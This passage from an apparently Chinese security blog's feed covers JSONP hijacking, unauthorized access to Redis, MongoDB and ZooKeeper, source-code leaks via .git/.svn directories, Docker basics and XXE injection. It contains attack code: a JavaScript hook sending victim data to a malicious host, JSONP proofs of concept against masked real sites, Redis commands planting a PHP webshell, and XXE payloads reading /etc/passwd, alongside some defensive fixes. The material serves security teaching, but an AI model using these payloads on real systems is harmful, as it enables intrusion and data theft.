3、于是可以判断，当前阶段如果想通过纯web端（ActiveX控件、服务端代理、属于未来的HTML5之Websocket等方式不算）跨域访问数据就只有一种可能，那就是在远程服务器上设法把数据装进js格式的文件里，供客户端调用和进一步处理； 4、恰巧我们已经知道有一种叫做JSON的纯字符数据格式可以简洁的描述复杂数据，更妙的是JSON还被js原生支持，所以在客户端几乎可以随心所欲的处理这种格式的数据； 5、这样子解决方案就呼之欲出了，web客户端通过与调用脚本一模一样的方式，来调用跨域服务器上动态生成的js格式文件（一般以JSON为后缀），显而易见，服务器之所以要动态生成JSON文件，目的就在于把客户端需要的数据装入进去。 （重点–简而言之。我们要加载远程文件而js又可以跨域，那么我们跨域调用远程js文件，便可以实现同源策略之下的跨域） 6、客户端在对JSON文件调用成功之后，也就获得了自己所需的数据，剩下的就是按照自己需求进行处理和展现了，这种获取远程数据的方式看起来非常像AJAX，但其实并不一样。 7、为了便于客户端使用数据，逐渐形成了一种非正式传输协议，人们把它称作JSONP，该协议的一个要点就是允许用户传递一个callback参数给服务端，然后服务端返回数据时会将这个callback参数作为函数名来包裹住JSON数据，这样客户端就可以随意定制自己的函数来自动处理返回数据了。 jsonp跨域实例前端jsonp.html &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;p&gt;jsonp测试页面&lt;/p&gt; &lt;meta charset=&quot;utf-8&quot; content=&quot;text/html; charset=gb2312&quot;/&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; // 得到航班信息查询结果后的回调函数 var flightHandler = function(data){ alert(&apos;你查询的航班结果是：票价 &apos; + data.price + &apos; 元，&apos; + &apos;余票 &apos; + data.tickets + &apos; 张。&apos;); }; // 提供jsonp服务的url地址（不管是什么类型的地址，最终生成的返回值都是一段javascript代码） var url = &quot;http://127.0.0.1/999.js?code=CA1998&amp;callback=flightHandler&quot;;//这里我们直接写在了js里传参，很多是在get的方式url里传参，而不是固定好了的。 // 创建script标签，设置其属性 var script = document.createElement(&apos;script&apos;); script.setAttribute(&apos;src&apos;, url); // 把script标签加入head，此时调用开始 document.getElementsByTagName(&apos;head&apos;)[0].appendChild(script); &lt;/script&gt; &lt;/head&gt; &lt;/body&gt; &lt;/html&gt; 后端则有一个规则生成了一段这样的代码提供给jsonp.html（服务端的实现这里就不演示了，与你选用的语言无关，说到底就是拼接字符串）： 示例固定的写一个json flightHandler({ &quot;code&quot;: &quot;CA1998&quot;, &quot;price&quot;: 1780, &quot;tickets&quot;: 5 }); 效果： 通过上述描述可以知道，若想实现JSONP，除了前端部分之外，还需要后端的配合，后端需返回符合JSONP要求的数据。比如java可以这样写： Map&lt;String,String&gt; map = new HashMap&lt;String,String&gt;(); map.put(&quot;result&quot;, &quot;content&quot;); String resultJSON = JSONObject.toJSONString(map); try { PrintWriter out = response.getWriter(); String jsonpCallback = request.getParameter(&quot;jsonpCallback&quot;);//回调函数 out.println(jsonpCallback+&quot;(&quot;+resultJSON+&quot;)&quot;);//返回jsonp格式数据 ，要用callback包装下 out.flush(); out.close(); } catch (Exception e) { e.printStackTrace(); } json劫持原理 （1）.你正常访问信任站点（http://www.Bank.com），然后登陆信任站点。 （2）.信任站点通过你的验证，并返回Cookie。 （3）.这时，在你还没有登出信任站点之前，你再打开了一个浏览器的tab页，并访问了一个恶意站点（www.BadGuy.com）。 （4）.恶意站点向请求用户访问http://www.Bank.com的一个资源。 （5）.浏览器带着之前的Cookie信息，向信任站点http://www.Bank.com发出了一个GET请求。 （6）.信任站点验证的Cookie信息通过，根据请求返回一个JSON数组（如果不清楚JSON，可以参考《JSON入门指南》）。 （7）.你的浏览器收到来自http://www.Bank.com的响应后，转发响应中的JSON信息给恶意站点。 至此，恶意站点拿到你关于http://www.Bank.com的信息。 到这里，你应该有对JavaScript Hijacking有一个大概的概念，它确实和CSRF很相像，唯一不同的是，CSRF是模拟你的身份去发送请求，JavaScript Hijacking是模拟你的身份，窃取你在服务器上的私隐信息。 JavaScript Hijacking攻击示范代码：演示代码之前，首先明确几点： （1）.恶意站点的攻击目标是明确的（这里目标就是http://www.Bank.com）。 （2）.恶意站点是通过用户给它返回信任网站的JSON数组（为什么是JSON数组？普通的JSON对象不行么？这个下面会提到！），从而获取用户私隐信息的。也就是说所谓的隐私数据，也就是这些JSON数组里面的数据，所以信任站点返回的不是JSON数组的数据或者JSON里面的信息是垃圾信息，那么这个恶意站点是徒劳的。 （3）.恶意站点必须实先知道用户返回的JSON的结构。 （4）.恶意站点能且只能发送GET请求…… （5）.这种攻击是需要浏览器支持的，至于为什么看下面吧。 恩，下面看一下攻击代码吧:&gt; 这个恶意站点www.BadGuy.com针对www.Bank.com的攻击代码： &lt;script type=&quot;text/javascript&quot;&gt; Object.prototype.__defineSetter__(&apos;money&apos;, function(obj) { var objString = &quot;&quot;; for (fld in this) {objString += fld + &quot;: &quot; + this[fld] + &quot;, &quot;; } req.open(&quot;GET&quot;, &quot;http://www.BadGuy.com?obj=&quot; +escape(objString),true); } req.send(null); ); &lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;http://www.Bank.com/UserInfo&quot;&gt;&lt;/script&gt; 在用户访问恶意网站时： &lt;script type=&quot;text/javascript&quot; src=&quot;http://www.Bank.com/UserInfo&quot;&gt;&lt;/script&gt; （1）.这段JS代码会要求浏览器发送一个GET请求到http://www.Bank.com/UserInfo，于是浏览器按照指示，带上本地的Cookie信息，发送一个http的GET请求。 （2）.www.Bank.Com接受到请求后，确认身份后，响应请求返回了一个JSON数组/JavaScript代码段。 （3）.客户端接受到这段JS脚本后，如果返回的是一个JSON数组，比如： [{&quot;Id&quot;:3,&quot;Name&quot;:hyddd,&quot;Money&quot;:10000}] JSON数组被认为是一段可执行的JavaScript脚本，于是浏览器会解析执行。 如果返回的是一个JSON对象呢？ {&quot;Id&quot;:3,&quot;Name&quot;:hyddd,&quot;Money&quot;:10000} 呵呵，这个是不会被浏览器执行的，因为浏览器认为：它不是一个JavaScript脚本。 如果它返回的是一个JavaScript脚本的话，恩，这得具体问题具体分析了，不一定能拿到什么数据。 （4）.看下面这段JavaScript脚本： &lt;script type=&quot;text/javascript&quot;&gt; Object.prototype.__defineSetter__(&apos;Money&apos;, function(obj) { var objString = &quot;&quot;; for (fld in this) {objString += fld + &quot;: &quot; + this[fld] + &quot;, &quot;; } req.open(&quot;GET&quot;, &quot;http://www.BadGuy.com?obj&quot;= +escape(objString),true); } req.send(null); ); &lt;/script&gt; 它的作用就是发送受害者的私隐信息到恶意站点的。 这里可能有人不理解，我大概说一下： Object.prototype.defineSetter，可以看做是JavaScript中的Hook（有人把这个称为JavaScript函数劫持，注意JavaScript的函数劫持和JavaScript Hijacking不是同一个概念，JavaScript Hijacking的核心思想和CSRF攻击的核心思想应该是一致的），这里是对Object的Money属性设置了一个Hook，在JavaScript中，由于其他的对象都是派生自Object的，所以这段代码就对所有对象的Money属性都做了一个Hook，当有对象设置它的Money属性时，都会触发上面这段代码的运行。注意的是：defineSetter这个在IE系列的浏览器好像是不受支持的（在IE6下试了不行），但FireFox系列的浏览器是肯定支持的。 后面的var objString=””…这就是发送受害者信息到恶意站点了，这里不说了。 当浏览器解析（3）中的JSON数组时，会新建一个对象并赋值，这时候就出发了上面这段代码，结果私隐信息就发送到恶意站点了。 通过 Object.prototype.__defineSetter__ 这个函数来触发自己的恶意代码。但是这个函数在当前的新版本chrome和firefox中都已经失效了。 解决方法1、验证 HTTP Referer 头信息； 2、在请求中添加 csrfToken 并在后端进行验证； jsonp劫持寻找jsonp的接口1.burp抓包，一般有jsonp的数据传输会在mimetype中显示为script，通过排序可以快速得找到 2.火狐控制台查找包 3.fuzz 如果jsonp的接口没有敏感信息传输，json数据包中恰好有的话，我们可以尝试一下程序员是否有开发jsonp的格式，大多数程序员喜欢把jsonp的回传参数命名为callback 当然还有其他的可能，字典用Intruder Fuzz一下试试： callback=attack cb=attack call=attack jsonp=attack jsonpcallback=attack jsonpcb=attack json=attack jsoncallback=attack jcb=attack 某云实例 复制到url里便可以检验是否存在jsonp接口漏洞。 修改callback原函数便可将json数据全部显示出来，一些敏感信息。 poc &lt;script&gt; function peiqi(json){ alert(json.result.pin) } &lt;/script&gt; &lt;script src=&quot;https://xx.xx.xx.xx/menu/getUserMenu?callback=peiqi&quot;&gt;&lt;/script&gt; poc可以继续构造制定发送到自己的页面，可见jsonp的原理与csrf基本为一致的，利用用户的身份来做一些事情，或者发送自己的信息给别人， 某X jsonp POC &lt;script&gt; function peiqi(json){ alert(json.userName) } &lt;/script&gt; &lt;script src=&quot;http://XX.XXXXX.com/checkLogin?callback=peiqi&amp;_=15436278817&quot;&gt;&lt;/script&gt; 目前挖掘jsonp 一般是F12 寻找callback函数，推荐一款自动检测XSS jsonp的谷歌插件 XssSniper 绕过一些对referer 进行验证，但是有的时候空referer可以绕过验证。 参考：https://blog.csdn.net/yjclsx/article/details/80340901参考：http://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.html参考：https://shiyousan.com/post/635441704246553316]]></content>
      <tags>
        <tag>渗透攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见信息泄露]]></title>
    <url>%2F2018%2F10%2F28%2F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%2F</url>
    <content type="text"><![CDATA[1.redis数据库任意访问简介redis默认数据库端口6379， 未设置密码造成任意访问，然后使用redis权限写文件。 Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。 部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。 目前比较主流的案例：yam2 minerd 挖矿程序，还有在多次应急事件中发现大量的watch-smartd挖矿木马。 命令使用info //查看redis版本信息、一些具体信息、服务器版本信息等等： set x “test” //将变量x的值设为test flushall //删除数据库，谨慎使用 KEYS * //查看所有键，redis存储数据模式为 一键一数据对应。 CONFIG GET dir //获取默认的redis目录 CONFIG GET dbfilename//获取默认的rdb文件名 往web物理路径写webshellredis远程连接 redis-cli -h xx.xx.xx.xxredis本地打开 redis-cliredis服务打开 redis-server 当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell 执行以下命令 192.168.63.xx:6379&gt; config set dir /var/www/html/ OK 192.168.63.xx:6379&gt; config set dbfilename shell.php OK 192.168.63.xx:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot; OK 192.168.63.xx:6379&gt; save OK 2.mongodb数据库任意访问简介mongodb默认数据库端口为27017 开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作(增删改高危动作)而且可以远程访问数据库 在刚安装完毕的时候MongoDB都默认有一个admin数据库,此时admin数据库是空的,没有记录权限相关的信息！当admin.system.users一个用户都没有时，即使mongod启动时添加了—auth参数,如果没有在admin数据库中添加用户,此时不进行任何认证还是可以做任何操作(不管是否是以—auth 参数启动),直到在admin.system.users中添加了一个用户。加固的核心是只有在admin.system.users中添加用户之后，mongodb的认证,授权服务才能生效 命令使用远程连接 mongodb ip root@xiaozhupeiqi:~# mongo xxx.xx.xx.xx MongoDB shell version: 2.6.10 connecting to: xx.xx.xx.xx/test Server has startup warnings: 2018-10-19T14:47:46.342+0800 I CONTROL [initandlisten] ** WARNING: You are running this process as the root user, which is not recommended. 2018-10-19T14:47:46.343+0800 I CONTROL [initandlisten] 2018-10-19T14:47:46.343+0800 I CONTROL [initandlisten] 2018-10-19T14:47:46.343+0800 I CONTROL [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/enabled is &apos;always&apos;. 2018-10-19T14:47:46.343+0800 I CONTROL [initandlisten] ** We suggest setting it to &apos;never&apos; 2018-10-19T14:47:46.343+0800 I CONTROL [initandlisten] 2018-10-19T14:47:46.343+0800 I CONTROL [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/defrag is &apos;always&apos;. 2018-10-19T14:47:46.343+0800 I CONTROL [initandlisten] ** We suggest setting it to &apos;never&apos; 2018-10-19T14:47:46.343+0800 I CONTROL [initandlisten] 利用sql语句 show databases; use admin; show tables; 等命令或者 show dbs; #查看全部数据库 show collections; #显示当前数据库中的集合（类似关系数据库中的表） show users; #查看当前数据库的用户信息 use dbname; #切换数据库跟mysql一样 显示db状态 db.stats() { &quot;db&quot; : &quot;admin&quot;, &quot;collections&quot; : 3, &quot;objects&quot; : 5, &quot;avgObjSize&quot; : 217.4, &quot;dataSize&quot; : 1087, &quot;storageSize&quot; : 69632, &quot;numExtents&quot; : 0, &quot;indexes&quot; : 5, &quot;indexSize&quot; : 122880, &quot;ok&quot; : 1 } 3.ZooKeeper未授权访问简介Zookeeper的默认开放端口是2181。Zookeeper安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内进行破坏（比如：kill命令）。攻击者能够执行所有只允许由管理员运行的命令。 漏洞利用执行以下命令即可远程获取该服务器的环境： echo envi | nc xx.xx.xx.xx 2181 zookeeper.version=3.4.10-39d3a4f269333c922ed3db283be479f9deacaa0f, built on 03/23/2017 10:13 GMT host.name=AY1304161249343xxxxx java.version=1.8.0_171 java.vendor=Oracle Corporation java.home=/usr/local/java/jdk1.8.0_171/jre java.class.path=/data/zookeeper-3.4.10/bin/../build/classes:/data/zookeeper-3.4.10/bin/../build/lib/*.jar:/data/zookeeper-3.4.10/bin/../lib/slf4j-log4j12-1.6.1.jar:/data/zookeeper-3.4.10/bin/../lib/slf4j-api-1.6.1.jar:/data/zookeeper-3.4.10/bin/../lib/netty-3.10.5.Final.jar:/data/zookeeper-3.4.10/bin/../lib/log4j-1.2.16.jar:/data/zookeeper-3.4.10/bin/../lib/jline-0.9.94.jar:/data/zookeeper-3.4.10/bin/../zookeeper-3.4.10.jar:/data/zookeeper-3.4.10/bin/../src/java/lib/*.jar:/data/zookeeper-3.4.10/bin/../conf:.:/usr/local/java/jdk1.8.0_171/lib:/usr/local/java/jdk1.8.0_171/jre/lib:.:$JAVA_HOME/lib:$JAVA_HOME/jre/lib java.library.path=/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib java.io.tmpdir=/tmp java.compiler=&lt;NA&gt; os.name=Linux os.arch=amd64 os.version=3.2.0-29-generic user.name=root user.home=/root user.dir=/data/zookeeper-3.4.10 防护1、禁止把Zookeeper直接暴露在公网 2、添加访问控制，根据情况选择对应方式（认证用户，用户名密码） 3、绑定指定IP访问 4.源码泄露篇.hg源码泄漏hg init的时候会生成.hg 工具：https://github.com/kost/dvcs-ripper 命令：rip-hg.pl -v -u http://www.example.com/.hg/ .git源码泄露原理：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。git非常之火就是因为.git文件，因为里面存储了各种记录日志版本以及更新的信息，几乎这里存储着git仓库从头到尾的文件，所以如果有.git泄露，你甚至可以找到各个版本的东西。 工具：https://github.com/lijiejie/GitHack 命令：python GitHack.py http://www.example.com/.git/ .DS_Store文件泄漏原理：在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。 工具：https://github.com/lijiejie/ds_store_exp 命令：python ds_store_exp.py http://www.example.com/.DS_Store .SVN导致文件泄露原理：SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，黑客则可以直接获得文件源代码。 在被利用的网址后面加 /.svn/entries，列出网站目录，甚至下载整站。 工具： https://www.waitalone.cn/seay-svn-poc-donw-20140505.html 命令：.exe文件傻瓜式操作粘贴 www.xxx.xx/.svn/entries .bzr源码泄露bzr也是个版本控制工具, 虽然不是很热门, 但它也是多平台支持, 并且有不错的图形界面,所以也有一些人认为bzr比git要好用。 原理：bzr在初始化项目时(bzr init/init-repo), 会在项目根目录产生名为.bzr的隐藏目录, 同样暴露了源代码和用户信息. 工具：https://github.com/kost/dvcs-ripper 命令：rip-bzr.pl -v -u http://www.example.com/.bzr/ .cvs源码泄露原理：CVS是一个年代比较久远的版本控制系统, 通过它可以追踪源代码的历史变化记录，但是因为功能比较简单, 而且不支持分支, 所以很早前就被上面提到的svn替代了。cvs项目在初始化(cvs checkout project)的时候, 会在project目录下创建一个名为CVS的目录,其中保存了各个文件的修改和commit记录. 通过此目录可以获取代码的历史版本. 其中两个关键文件为:CVS/Root和CVS/Entries, 分别记录了项目的根信息和所有文件的结构。 工具： https://github.com/kost/dvcs-ripper WEB-INF/web.xml泄露 WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。 WEB-INF主要包含一下文件或目录： /WEB-INF/web.xml ：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/ ：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 /WEB-INF/lib/ ：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/ ：源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties ：数据库配置文件 原理：通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。 一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！ 利用：通过web.xml文件推测应用组件相关类的名字, 然后在src目录下查找代码, 如果没有源代码可以直接下载class文件反编译即可 网站备份文件泄露原理：在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。 .rar .zip .7z .tar.gz .bak .swp .txt #参考：https://www.secpulse.com/archives/61101.htmlhttp://www.hacksec.cn/Penetration-test/474.html]]></content>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker学习]]></title>
    <url>%2F2018%2F10%2F12%2Fdocker%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[docker基础镜像：是一个只读的模板，类似于安装系统用到的那个iso文件，我们通过镜像来完成各种应用的部署。镜像可以用来创建Docker容器 容器：镜像类似于操作系统，而容器类似于虚拟机本身。它可以被启动、开始、停止、删除等操作，每个容器都是相互隔离的。可以把容器看做是一个简易版的linux环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。 仓库：存放镜像的一个场所，仓库分为公开仓库和私有仓库。 最大的公开仓库是Docker hub（hub.docker.com），国内公开仓库（dockerpool.com） docker基础命令docker search ubuntu —查找ubuntu系统的容器 docker pull ubuntu —下载ubuntu容器 docker images —查看现有的镜像 docker ps —查看docker的进程 docker ps -a —查看docker所有运行过的进程 docker rm 名字 —删除已经停止进程的容器 docker rmi ubuntu —删除镜像 docker start -i 名字 —启动已经关闭的进程 docker stop 名字 —关闭运行的容器 docker run –name 起名字 -d 容器 /bin/bash — -d是以后台的形式运行 docker logs -t peiqi12 — t为显示时间的形式显示进程容器log日志 docker run -p 41061:22 -p 8888:80 -d -v /web tomsik68/xampp —访问的时候利用ssh访问镜像 ssh -p 41061 root@localhost —密码root可以连接ssh进入xampp主机 在www目录下创建index.html即可。访问url xx.xx.xx.xx:8888/www/index.html 参数说明-a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项； -d: 后台运行容器，并返回容器ID； -i: 以交互模式运行容器，通常与 -t 同时使用； -t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用； –name=”nginx-lb”: 为容器指定一个名称； –dns 8.8.8.8: 指定容器使用的DNS服务器，默认和宿主一致； –dns-search example.com: 指定容器DNS搜索域名，默认和宿主一致； -h “mars”: 指定容器的hostname； -e username=”ritchie”: 设置环境变量； –env-file=[]: 从指定文件读入环境变量； –cpuset=”0-2” or –cpuset=”0,1,2”: 绑定容器到指定CPU运行； -m :设置容器使用内存最大值； –net=”bridge”: 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型； –link=[]: 添加链接到另一个容器； –expose=[]: 开放一个端口或一组端口； 实战运行 上述命令我们开启了 docker服务，并且以交互式命令并且以伪终端（因为docker都是以进程的形式运行）的形式，进入了docker交互页面，参考上面-i -t，并且给容器名字命名为 ubuntu，主机名为 test。 /bin/bash的作用是因为docker后台必须运行一个进程，否则容器就会退出，在这里表示启动容器后启动bash。所有docker容器都是以进程而存活，如果没有进程那么自动关闭。 这样进入搭建docker，如果退出终端的话，相应进程也会关闭，docker也就终止，我们接下来介绍一个长期能够搭建在web上的docker命令。 我们用端口映射进入docker进程， -p 物理机端口:容器端口。这里设置了两个端口，一个是方便进入容器管理，另一个是映射80端口服务，-d返回容器ID，-v称之为 挂载也称为存储卷。此时在/www目录写web，整套的 docker web服务进程搭建完毕。 这样便会在后台进程运行，其他命令如： docker run hello-world只是一个进程，运行完毕就消失了。 总结1.docker 可以理解为开启一个或一些进程，但是环境和物理机是分开的，可以用端口映射，映射到物理机，在物理机上是一套完整的操作系统，会占用其他资源，但是docker是进程级别的，资源全部用在进程上，所以速度会快。 2.可一台服务器搭建多个分离的linux环境，Docker容器可以理解为在沙盒中运行的进程，这个沙盒包含了该进程运行所必须的资源，包括文件系统、系统类库、shell 环境等。但这个沙盒默认是不会运行任何程序的，需要在沙盒中运行一个进程来启动某一个容器。这个进程是该容器的唯一进程，所以当该进程结束的时候，容器也会完全停止。 3.使用方便速度快，由于是一个进程，所以只需要一个命令打开进程便可以开启一个web服务上线一套网站等且环境与物理机分离，对物理机来说比较安全。或者其他服务等。]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XML注入，xxe，xpath]]></title>
    <url>%2F2018%2F10%2F10%2Fxml%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[XML基础众所周知，xml常用于数据存储和传输，文件后缀为 .xml；它是可扩展标记语言（Extensible Markup Language，简称XML），是一种标记语言。XML 被设计为传输和存储数据，其焦点是数据的内容。 1.为什么要使用XML为了便于不用应用、不同平台之间的数据共享和通信。 如 windows 与linux 跨系统交互网站与手机APP信息交互订票软件与支付软件跨平台交互 2.XML代码解析&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;note&gt; &lt;to&gt;chybeta&lt;/to&gt; &lt;from&gt;ph0en1x&lt;/from&gt; &lt;/note&gt; 在上面代码中的第一行，定义XML的版本与编码。在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一 个根元素。如上代码，是整个文档的根元素。嵌套在note标签中的和则是 根的子元素。同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。 3.语法规则–dtd文档类型定义(Document Type Definition)是一套为了进行程序间的数据交换而建立的关于标记符的语法规则。它是标准通用标记语言和 [1] 可扩展标记语言1.0 版规格的一部分，文档可根据某种DTD语法规则验证格式是否符合此规则。文档类型定义也可用做保证标准通用标记语言、可扩展标记语言文档格式的合法性，可 通过比较文档和文档类型定义文件来检查文档是否符合规范，元素和标签使用是否正确。文件实例提供应用程序一个数据交换的格式。使用各类文档类型定义是为了 让标准通用标记语言、可扩展标记语言文件能符合规定的数据交换标准，因为这样，不同的公司只需定义好标准文档类型定义，就都能依文档类型定义建立文档实 例，并且进行验证，如此就可以轻易交换数据，防止了实例数据定义不同等原因造成的数据交换障碍，满足了网络共享和数据交互。文档类型定义文件是一个美国信息交换标准代码文本文件。 参考资料：https://blog.csdn.net/yeoman92/article/details/53055749 4.实体所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声 明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。实体类型：XML实体分为四种：字符实体，命名实体，外部实体，参数实体。 5.文档类型声明文档类型定义可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。★它可被成行地声明于 XML 文档中，也可作为一个外部引用。 //漏洞触发点通过它，您的每一个 XML 文件均可携带一个有关其自身格式的描述。通过它，独立的团体可一致地使用某个标准的文档类型定义来交换数据。而您的应用程序也可使用某个标准的文档类型定义来验证从外部接收到的数据。您还可以使用它来验证您自身的数据。 内部声明假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 !DOCTYPE 声明中：&lt;!DOCTYPE根元素 [元素声明]&gt;带有 DTD 的 XML 文档实例 &lt;?xmlversion=&quot;1.0&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt; &lt;note&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;from&gt;Jani&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&apos;t forget me this weekend&lt;/body&gt; &lt;/note&gt; 以上 DTD 解释如下：!DOCTYPE note (第二行)定义此文档是 note 类型的文档。!ELEMENT note (第三行)定义 note 元素有四个元素：”to、from、heading,、body”!ELEMENT to (第四行)定义 to 元素为 “#PCDATA” 类型!ELEMENT from (第五行)定义 from 元素为 “#PCDATA” 类型!ELEMENT heading (第六行)定义 heading 元素为 “#PCDATA” 类型!ELEMENT body (第七行)定义 body 元素为 “#PCDATA” 类型 外部声明假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：&lt;!DOCTYPE 根元素 SYSTEM “文件名”&gt;这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD: &lt;?xmlversion=&quot;1.0&quot;?&gt; &lt;!DOCTYPE note SYSTEM&quot;note.dtd&quot;&gt; &lt;note&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;from&gt;Jani&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&apos;t forget me this weekend!&lt;/body&gt; &lt;/note&gt; note.dtd 文件： &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; xml漏洞–XXE1.漏洞产生的原因XML文件的解析依赖libxml库，而libxml2.9以前的版本默认支持并开启了外部实体的引用，服务端解析用户提交的xml文件时未对xml文件 引用的外部实体（含外部普通实体和外部参数实体）做合适的处理，并且实体的URL支持file://和php://等协议，攻击者可以在xml文件中声明 URI指向服务器本地的实体造成攻击。 2.xxe本地测试有回显读取文件windows环境下 测试PHP源代码 &lt;?php $data = file_get_contents(&apos;php://input&apos;); $xml = simplexml_load_string($data); echo $xml-&gt;name; ?&gt; 正常用户提交代码 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; &lt;user&gt; &lt;name&gt;Striker666666666666&lt;/name&gt; &lt;wechat&gt;strikersb&lt;/wechat&gt; &lt;public_wechat&gt;sec_fe&lt;/public_wechat&gt; &lt;/user&gt; 恶意代码构造（有回显） &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; //它定义 XML 的版本 (1.0) 和所使用的编码 )。 &lt;!DOCTYPE a [ &lt;!ENTITY aa SYSTEM &quot;file:///D:/1.txt&quot;&gt; ]&gt; //引用实体system中的file 读取文件。 &lt;user&gt; //根元素说明是用户的信息 &lt;name&gt;&amp;b;&lt;/name&gt;//名字，源代码中意为输出name标签里的数据，&amp;b 将第二行中的b实体化。然后引用，利用file协议读取C盘下的txt文件 &lt;wechat&gt;strikersb&lt;/wechat&gt; &lt;public_wechat&gt;sec_fe&lt;/public_wechat&gt; &lt;website&gt;aaa&lt;/website&gt; &lt;/user&gt; linux 本地xml测试&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE Anything [ &lt;!ENTITY entityex SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;name&gt;&amp;entityex;&lt;/name&gt; 可以读取passwd。 如果要读取php文件，因为php、html等文件中有各种括号&lt;，&gt;，若直接用file读取会导致解析错误，此时可以利用php://filter将内容转换为base64后再读取。 本地测试利用的是云服务器，没有回显，未读取成功，linux下未测试成功。- -。 3.本地测试无回显注入读取文件&lt;!DOCTYPE a [ 